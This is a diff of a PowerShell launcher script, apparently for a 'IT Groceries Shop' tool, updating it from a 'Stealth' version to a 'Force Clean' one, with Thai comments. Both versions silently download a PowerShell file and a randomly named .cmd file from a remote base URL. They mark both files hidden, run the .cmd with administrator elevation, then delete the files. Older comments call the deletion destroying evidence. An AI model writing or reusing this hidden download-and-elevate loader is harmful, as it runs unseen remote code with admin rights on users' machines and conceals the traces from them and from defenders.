@@ -1,5 +1,5 @@
 # --- IT Groceries Shop Launcher ---
-# Version: 1.2 (Stealth)
+# Version: 1.3 (Force Clean)
 # See 'Changes.log' for version history.
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -27,31 +27,37 @@ $StealthFile = "$tmpDir\$RandomName.cmd"
 Write-Host "`n[ INITIALIZING ] LAUNCHING...IT Groceries Launcher [Cloud UI]" -ForegroundColor Cyan
 
 try {
-    # Step 1: Master Engine
-    Invoke-WebRequest -Uri "$BaseURL/Master.ps1" -OutFile "$tmpDir\Master.ps1" -UseBasicParsing -ErrorAction Stop
-    # ซ่อนไฟล์ Master ด้วย
-    (Get-Item "$tmpDir\Master.ps1").Attributes = 'Hidden'
+    # =========================================================
+    # [FIX] FORCE CLEANUP ROUTINE
+    # แก้ปัญหา Access Denied กรณีไฟล์เก่าค้างและเป็น Hidden
+    # =========================================================
+    if (Test-Path $MasterFile) {
+        # ปลด Hidden/ReadOnly ออกก่อน
+        (Get-Item $MasterFile).Attributes = 'Normal'
+        # ลบทิ้งแบบบังคับ
+        Remove-Item $MasterFile -Force -ErrorAction SilentlyContinue
+    }
+    # =========================================================
 
-    # Step 2: Installer UI
+    # Step 1: Download Master
+    Invoke-WebRequest -Uri "$BaseURL/Master.ps1" -OutFile $MasterFile -UseBasicParsing -ErrorAction Stop
+    (Get-Item $MasterFile).Attributes = 'Hidden'
+
+    # Step 2: Download UI
     $cmdContent = (Invoke-WebRequest -Uri "$BaseURL/InstallerCloud.cmd" -UseBasicParsing -ErrorAction Stop).Content
     $cmdContent = $cmdContent -replace "`r`n", "`n" -replace "`n", "`r`n"
-    
-    # เขียนไฟล์ลงชื่อสุ่ม
     [System.IO.File]::WriteAllText($StealthFile, $cmdContent, [System.Text.Encoding]::ASCII)
 
-    # [STEALTH] สั่งซ่อนไฟล์ทันที (Hidden Attribute)
+    # Step 3: Execute
     if (Test-Path $StealthFile) {
         (Get-Item $StealthFile).Attributes = 'Hidden'
-        
         Write-Host "Launching..." -ForegroundColor Green
         Start-Sleep 1
-        
-        # รันไฟล์ที่ซ่อนอยู่
         Start-Process -FilePath $StealthFile -ArgumentList "am_admin" -Verb RunAs -Wait
         
-        # ทำลายหลักฐาน (Cleanup)
-        Remove-Item $StealthFile -Force
-        Remove-Item "$tmpDir\Master.ps1" -Force
+        # Final Cleanup
+        if (Test-Path $StealthFile) { (Get-Item $StealthFile).Attributes = 'Normal'; Remove-Item $StealthFile -Force }
+        if (Test-Path $MasterFile)  { (Get-Item $MasterFile).Attributes  = 'Normal'; Remove-Item $MasterFile  -Force }
     }
 } catch {
     Write-Host "Error: $_" -ForegroundColor Red
